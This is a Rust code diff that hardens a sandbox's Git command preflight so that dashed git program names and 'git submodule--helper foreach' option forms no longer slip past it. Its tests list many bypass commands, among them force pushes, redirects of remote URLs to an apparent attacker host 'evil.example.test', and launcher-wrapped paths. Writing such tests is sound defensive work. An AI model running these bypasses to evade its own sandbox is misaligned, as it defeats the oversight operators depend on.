@@ -1083,7 +1083,11 @@ fn refuse_unread_git_tail(words: &[Word], from: usize) -> Result<()> {
             continue;
         }
         let name = basename(&word.text);
-        if name == "git" || is_git_plumbing_executable(name) || is_shell_name(name) {
+        if name == "git"
+            || is_git_plumbing_executable(name)
+            || is_git_program_word(&word.text)
+            || is_shell_name(name)
+        {
             return Err(denied(format!(
                 "a command this preflight cannot read ({command}) names git; use a recognized command form"
             )));
@@ -1427,6 +1431,13 @@ fn scan_simple_command(words: &[Word], preflight: Preflight<'_>, depth: usize) -
                 return Err(denied(format!(
                     "{name} is not supported by manifest Git preflight"
                 )));
+            }
+            // Git's dispatcher runs `git-foo` for `git foo`, and its exec path
+            // holds those programs under the dashed names. Read the dashed
+            // spelling as the subcommand it is, so `git-push -f` cannot pass
+            // where `git push -f` is refused.
+            name if git_dashed_program(name).is_some() => {
+                return inspect_git_dashed_command(words, index, preflight, depth);
             }
             _ => return refuse_unread_git_tail(words, index),
         }
@@ -2010,6 +2021,10 @@ fn inspect_git_command(words: &[Word], preflight: Preflight<'_>, depth: usize) -
         "config" => authorize_config(args),
         "archive" => authorize_archive(args, preflight),
         "submodule" => authorize_submodule(args, preflight, depth),
+        // The program behind `git submodule`. Only `foreach` is read, with the
+        // helper's own option rules; its other subcommands are internal and
+        // take arguments this preflight does not read, so they are refused.
+        "submodule--helper" => authorize_submodule_helper(args, preflight, depth),
         "rebase" | "bisect" => authorize_shell_bodies(args, sub.text.as_str(), preflight, depth),
         // Porcelain `push` is not the only path to a remote. The plumbing
         // verbs speak the transport protocol directly, take their own
@@ -2039,6 +2054,82 @@ fn is_remote_transport_plumbing(verb: &str) -> bool {
 fn is_git_plumbing_executable(name: &str) -> bool {
     name.strip_prefix("git-")
         .is_some_and(is_remote_transport_plumbing)
+}
+
+/// Git's dispatcher runs `git <verb>` as the program `git-<verb>` in its exec
+/// path (`/usr/lib/git-core/git-push`, or a bare `git-push` on `PATH`). Return
+/// the subcommand a dashed program name stands for, so the dashed spelling is
+/// read by the same code as the subcommand it is.
+fn git_dashed_program(name: &str) -> Option<&str> {
+    name.strip_prefix("git-").filter(|verb| !verb.is_empty())
+}
+
+/// Whether a word in an unread command's tail names a dashed git program that
+/// the scan would have to read: a program in a git exec directory by path, or
+/// a bare program whose verb is a git subcommand the preflight knows. The verb
+/// test keeps directory and package names (`/usr/lib/git-core`, `git-core`)
+/// from reading as programs.
+fn is_git_program_word(word: &str) -> bool {
+    let name = basename(word);
+    let Some(verb) = git_dashed_program(name) else {
+        return false;
+    };
+    // A known verb is a git program by any path: `…/git-core//git-push` and
+    // `…/git-core/./git-push` name the same file (AMP-2). Any other dashed
+    // name counts when a directory before it is `git-core`; the last part
+    // itself is not tested, so `/usr/lib/git-core` stays a directory.
+    is_known_git_verb(verb)
+        || word
+            .rsplit_once('/')
+            .is_some_and(|(directory, _)| directory.split('/').any(|part| part == "git-core"))
+}
+
+/// The git subcommands the preflight reads, plus the plumbing verbs it refuses.
+/// A dashed program is dispatched to the subcommand of the same name, so these
+/// are the verbs whose dashed spelling changes what runs.
+fn is_known_git_verb(verb: &str) -> bool {
+    matches!(
+        verb,
+        "clone"
+            | "fetch"
+            | "pull"
+            | "push"
+            | "ls-remote"
+            | "remote"
+            | "config"
+            | "archive"
+            | "submodule"
+            | "submodule--helper"
+            | "rebase"
+            | "bisect"
+    ) || is_remote_transport_plumbing(verb)
+}
+
+/// Read a dashed program (`git-push`, `/usr/lib/git-core/git-clone`) as the
+/// subcommand it stands for. The program takes the subcommand's own
+/// arguments — it does not accept `git`'s global options — so the verb is
+/// placed where `inspect_git_command` looks for it and nothing is skipped
+/// ahead of it.
+fn inspect_git_dashed_command(
+    words: &[Word],
+    index: usize,
+    preflight: Preflight<'_>,
+    depth: usize,
+) -> Result<()> {
+    let Some(verb) = git_dashed_program(basename(&words[index].text)) else {
+        return Ok(());
+    };
+    let mut rewritten = Vec::with_capacity(words.len() - index + 1);
+    rewritten.push(Word {
+        text: "git".to_string(),
+        dynamic: false,
+    });
+    rewritten.push(Word {
+        text: verb.to_string(),
+        dynamic: words[index].dynamic,
+    });
+    rewritten.extend_from_slice(&words[index + 1..]);
+    inspect_git_command(&rewritten, preflight, depth)
 }
 
 fn authorize_clone(args: &[Word], preflight: Preflight<'_>) -> Result<()> {
@@ -2505,6 +2596,18 @@ fn foreach_script(tail: &[&Word]) -> Option<Word> {
     Some(script)
 }
 
+/// `git submodule foreach` options. The porcelain has `--quiet` and
+/// `--recursive`; the `submodule--helper` behind it also accepts their
+/// unambiguous long-option abbreviations (`--q`, `--r`, …), so both spellings
+/// are stepped over here.
+fn is_submodule_foreach_option(word: &str) -> bool {
+    let long = |name: &str| {
+        word.strip_prefix("--")
+            .is_some_and(|given| !given.is_empty() && name.starts_with(given))
+    };
+    matches!(word, "-q" | "--quiet" | "--recursive") || long("quiet") || long("recursive")
+}
+
 /// `git submodule foreach` runs its whole operand tail, directly or through
 /// a shell. Reading only the first word left `foreach sh -c '<body>'`
 /// unscanned.
@@ -2515,16 +2618,69 @@ fn authorize_submodule_foreach(
 ) -> Result<()> {
     let mut tail = operands
         .iter()
-        .skip_while(|word| matches!(word.text.as_str(), "-q" | "--quiet" | "--recursive"));
+        .skip_while(|word| is_submodule_foreach_option(&word.text));
     let first = tail.next();
     let tail: Vec<&Word> = match first {
         Some(word) if word.text == "--" => tail.collect(),
+        // The helper's option parser also takes the negations
+        // (`--no-recursive`, `--no-q`), a repeated `-qq` and
+        // `--end-of-options`, and then runs the body after them; the
+        // porcelain answers each with its usage text. An operand that is still
+        // an option is refused rather than read as the command (AMP-1).
+        Some(word) if word.text.starts_with('-') => {
+            return Err(denied(format!(
+                "git submodule foreach option {} is not supported by manifest Git preflight",
+                word.text
+            )));
+        }
         Some(word) => std::iter::once(word).chain(tail).collect(),
         None => Vec::new(),
     };
     match foreach_script(&tail) {
         Some(script) => scan_shell_body(&script, preflight, depth),
         None => Ok(()),
+    }
+}
+
+/// The helper parses its options with git's default rules, which also take
+/// an option after the first operand and drop the first `--`: `foreach sh --
+/// -c '<body>'` runs `sh -c '<body>'`, which the reader would see as `sh --
+/// -c …` (AMP-1, second read). Unless a leading `--` ended the options, an
+/// option word after the first operand is refused. The porcelain is not
+/// affected: it puts its own `--` before the body.
+fn refuse_helper_late_options(operands: &[Word]) -> Result<()> {
+    let mut rest = operands
+        .iter()
+        .skip_while(|word| is_submodule_foreach_option(&word.text));
+    match rest.next() {
+        Some(word) if word.text == "--" => Ok(()),
+        _ => match rest.find(|word| word.text.starts_with('-')) {
+            Some(word) => Err(denied(format!(
+                "git submodule--helper foreach option {} after the command is not supported by manifest Git preflight",
+                word.text
+            ))),
+            None => Ok(()),
+        },
+    }
+}
+
+/// `git submodule--helper` is the builtin behind `git submodule`. Only its
+/// `foreach` is read, because that is the one subcommand that runs a body the
+/// scan can check; the rest take internal arguments this preflight does not
+/// read, so they are refused rather than allowed to inherit the catch-all.
+fn authorize_submodule_helper(args: &[Word], preflight: Preflight<'_>, depth: usize) -> Result<()> {
+    let Some((action, operands)) = args.split_first() else {
+        return Ok(());
+    };
+    match action.text.as_str() {
+        "foreach" => {
+            refuse_helper_late_options(operands)?;
+            authorize_submodule_foreach(operands, preflight, depth)
+        }
+        _ => Err(denied(format!(
+            "git submodule--helper {} is not supported by manifest Git preflight",
+            action.text
+        ))),
     }
 }
 
@@ -3581,6 +3737,236 @@ mod tests {
                 matches!(error, SandboxError::CapabilityDenied { .. }),
                 "{command}: {error}"
             );
+        }
+    }
+
+    /// WI#886: `git <verb>` and the dashed program `git-<verb>` in git's exec
+    /// path are the same command, so the dashed spelling gets the same reading
+    /// as the subcommand — for a bare name and for any path.
+    #[test]
+    fn dashed_git_programs_get_the_same_reading_as_the_subcommand() {
+        let (temp, _) = workspace_with_remote();
+        let cwd = temp.path().canonicalize().unwrap();
+        // Only `origin` is granted, so `upstream` is an ungranted remote.
+        let host =
+            GitGrantConfig::from_parts("origin=file:///workspace/remotes/origin.git", "origin")
+                .unwrap()
+                .unwrap();
+        let grant = authorize_grant(&host, &[], &cwd, SandboxNetworkMode::ProxyEnforced).unwrap();
+
+        // A forced push is refused under every spelling of the program.
+        for command in [
+            "git push -f origin master",
+            "git-push -f origin master",
+            "/usr/lib/git-core/git-push -f origin master",
+            "/usr/libexec/git-core/git-push -f origin master",
+            "env git-push -f origin master",
+            "git-push origin +master",
+            "sh -c 'git-push -f origin master'",
+            "true && /usr/lib/git-core/git-push -f origin master",
+            "sudo /usr/lib/git-core/git-push -f origin master",
+            "./git-push -f origin master",
+            "xargs git-push -f origin master",
+        ] {
+            let error = check_granted(command, &grant).unwrap_err();
+            assert!(
+                matches!(error, SandboxError::CapabilityDenied { .. }),
+                "{command}: {error}"
+            );
+        }
+        // A read of an ungranted remote is refused under both spellings.
+        for command in [
+            "git fetch upstream",
+            "git-fetch upstream",
+            "/usr/lib/git-core/git-fetch upstream",
+            "git-fetch https://evil.example.test/repo.git",
+            "git clone https://evil.example.test/repo.git",
+            "git-clone https://evil.example.test/repo.git",
+            "git-pull upstream main",
+            "git-ls-remote upstream",
+            "git-remote add backup https://evil.example.test/repo.git",
+            "git-archive --remote=upstream HEAD",
+        ] {
+            let error = check_granted(command, &grant).unwrap_err();
+            assert!(
+                matches!(error, SandboxError::CapabilityDenied { .. }),
+                "{command}: {error}"
+            );
+        }
+        // `git config` writes of a redirecting key are refused by path too.
+        for command in [
+            "git config remote.origin.url https://evil.example.test/repo.git",
+            "git-config remote.origin.url https://evil.example.test/repo.git",
+            "/usr/lib/git-core/git-config remote.origin.url https://evil.example.test/r.git",
+            "git-config url.https://evil.example.test/.insteadOf https://git.example.test/",
+        ] {
+            let error = check_granted(command, &grant).unwrap_err();
+            assert!(
+                matches!(error, SandboxError::CapabilityDenied { .. }),
+                "{command}: {error}"
+            );
+        }
+        // The transport plumbing keeps its refusal under the dashed name.
+        for command in [
+            "git-send-pack /workspace/remotes/origin.git HEAD:refs/heads/x",
+            "/usr/lib/git-core/git-send-pack /workspace/remotes/origin.git HEAD:x",
+            "git-fetch-pack https://evil.example.test/repo.git",
+        ] {
+            let error = check_granted(command, &grant).unwrap_err();
+            assert!(
+                matches!(error, SandboxError::CapabilityDenied { .. }),
+                "{command}: {error}"
+            );
+            assert!(
+                error
+                    .to_string()
+                    .contains("not supported by manifest Git preflight"),
+                "{command}: {error}"
+            );
+        }
+        // Ordinary commands keep passing, including the granted spellings.
+        for command in [
+            "git push origin main",
+            "git-push origin main",
+            "/usr/lib/git-core/git-push origin main",
+            "git-fetch origin",
+            "git-clone file:///workspace/remotes/origin.git",
+            "git-config --get remote.origin.url",
+            "git submodule foreach 'cargo build'",
+            "grep git README",
+            "ls /usr/lib/git-core",
+            "du -sh /usr/lib/git-core",
+            "cargo build",
+        ] {
+            check_granted(command, &grant).unwrap_or_else(|error| panic!("{command}: {error}"));
+        }
+    }
+
+    /// WI#886 AMP-1, AMP-2: the helper's other option forms, and dashed
+    /// programs by another path spelling behind an unread launcher.
+    #[test]
+    fn foreach_option_forms_and_dashed_path_spellings_are_refused() {
+        let (temp, _) = workspace_with_remote();
+        let cwd = temp.path().canonicalize().unwrap();
+        let host =
+            GitGrantConfig::from_parts("origin=file:///workspace/remotes/origin.git", "origin")
+                .unwrap()
+                .unwrap();
+        let grant = authorize_grant(&host, &[], &cwd, SandboxNetworkMode::ProxyEnforced).unwrap();
+
+        // AMP-1: git's option parser takes these before the body and runs it.
+        for command in [
+            "git submodule--helper foreach --no-recursive 'git push -f origin master'",
+            "git submodule--helper foreach --no-quiet 'git push -f origin master'",
+            "git submodule--helper foreach --no-rec 'git push -f origin master'",
+            "git submodule--helper foreach --no-q 'git push -f origin master'",
+            "git submodule--helper foreach -qq 'git push -f origin master'",
+            "git submodule--helper foreach --end-of-options 'git push -f origin master'",
+            "git submodule--helper foreach -q --no-recursive 'git push -f origin master'",
+            "git submodule--helper foreach --no-recursive 'git fetch upstream'",
+            "/usr/lib/git-core/git-submodule--helper foreach --no-recursive 'git push -f origin master'",
+            "git -C . submodule--helper foreach --no-quiet 'git push -f origin master'",
+            "git submodule foreach --no-recursive 'git push -f origin master'",
+            "git submodule--helper foreach sh -- -c 'git push -f origin master'",
+            "git submodule--helper foreach env -- -S 'git push -f origin master'",
+            "/usr/lib/git-core/git-submodule--helper foreach sh -- -c 'git push -f origin master'",
+        ] {
+            let error = check_granted(command, &grant).unwrap_err();
+            assert!(
+                matches!(error, SandboxError::CapabilityDenied { .. }),
+                "{command}: {error}"
+            );
+        }
+        // AMP-2: the same program by another path spelling, behind launchers
+        // the scan does not read.
+        for command in [
+            "stdbuf -o0 /usr/lib/git-core//git-push -f origin master",
+            "stdbuf -o0 /usr/lib/git-core/./git-push -f origin master",
+            "setsid /usr/lib/git-core//git-push -f origin master",
+            "taskset -c 0 /usr/lib/git-core/./git-push -f origin master",
+            "xargs /usr/lib/git-core//git-push -f origin master",
+            "flock /tmp/l /usr/lib/git-core//git-push -f origin master",
+            "stdbuf -o0 /usr/lib/git-core//git-fetch upstream",
+            "stdbuf -o0 /usr/lib/git-core//git-submodule--helper foreach 'git push -f origin master'",
+        ] {
+            let error = check_granted(command, &grant).unwrap_err();
+            assert!(
+                matches!(error, SandboxError::CapabilityDenied { .. }),
+                "{command}: {error}"
+            );
+        }
+        // Ordinary work: the options git documents, and reads of the
+        // exec directory itself.
+        for command in [
+            "git submodule foreach --recursive 'cargo build'",
+            "git submodule foreach --quiet --recursive -- 'cargo build'",
+            "git submodule--helper foreach --rec 'cargo build'",
+            "du -sh /usr/lib/git-core",
+            "ls /usr/lib/git-core",
+            "stdbuf -o0 ls /usr/lib/git-core",
+        ] {
+            check_granted(command, &grant).unwrap_or_else(|error| panic!("{command}: {error}"));
+        }
+    }
+
+    /// WI#886: `git submodule--helper` is the program behind `git submodule`,
+    /// and its `foreach` body runs the same way. Read it with the helper's own
+    /// option rules; refuse the subcommands the preflight does not read.
+    #[test]
+    fn submodule_helper_foreach_is_read_like_submodule_foreach() {
+        let (temp, _) = workspace_with_remote();
+        let cwd = temp.path().canonicalize().unwrap();
+        let host =
+            GitGrantConfig::from_parts("origin=file:///workspace/remotes/origin.git", "origin")
+                .unwrap()
+                .unwrap();
+        let grant = authorize_grant(&host, &[], &cwd, SandboxNetworkMode::ProxyEnforced).unwrap();
+
+        for command in [
+            // The measured rows, with their porcelain controls.
+            "git submodule foreach 'git push -f origin master'",
+            "git submodule--helper foreach 'git push -f origin master'",
+            "git submodule--helper foreach --rec 'git push -f origin master'",
+            "git submodule--helper foreach --quiet --recursive -- 'git push -f origin master'",
+            "/usr/lib/git-core/git-submodule foreach 'git push -f origin master'",
+            "/usr/lib/git-core/git-submodule--helper foreach 'git push -f origin master'",
+            // The helper accepts every unambiguous long-option prefix.
+            "git submodule--helper foreach --r 'git push -f origin master'",
+            "git submodule--helper foreach --recu 'git push -f origin master'",
+            "git submodule--helper foreach --q 'git push -f origin master'",
+            "git submodule--helper foreach -q --rec 'git push -f origin master'",
+            // The whole operand tail is one script, as for the porcelain.
+            "git submodule--helper foreach sh -c 'git push -f origin master'",
+            "git submodule--helper foreach git fetch upstream",
+            "git submodule--helper foreach 'git fetch upstream'",
+        ] {
+            let error = check_granted(command, &grant).unwrap_err();
+            assert!(
+                matches!(error, SandboxError::CapabilityDenied { .. }),
+                "{command}: {error}"
+            );
+        }
+        // Subcommands the preflight does not read are refused, not allowed to
+        // inherit the catch-all.
+        for command in [
+            "git submodule--helper status",
+            "git submodule--helper add /workspace/remotes/origin.git",
+            "git submodule--helper clone",
+        ] {
+            let error = check_granted(command, &grant).unwrap_err();
+            assert!(
+                matches!(error, SandboxError::CapabilityDenied { .. }),
+                "{command}: {error}"
+            );
+        }
+        for command in [
+            "git submodule foreach 'cargo build'",
+            "git submodule--helper foreach 'cargo build'",
+            "git submodule--helper foreach --rec 'cargo build'",
+            "git submodule--helper foreach --quiet --recursive -- 'cargo build'",
+            "git submodule--helper foreach echo hi there",
+        ] {
+            check_granted(command, &grant).unwrap_or_else(|error| panic!("{command}: {error}"));
         }
     }
 
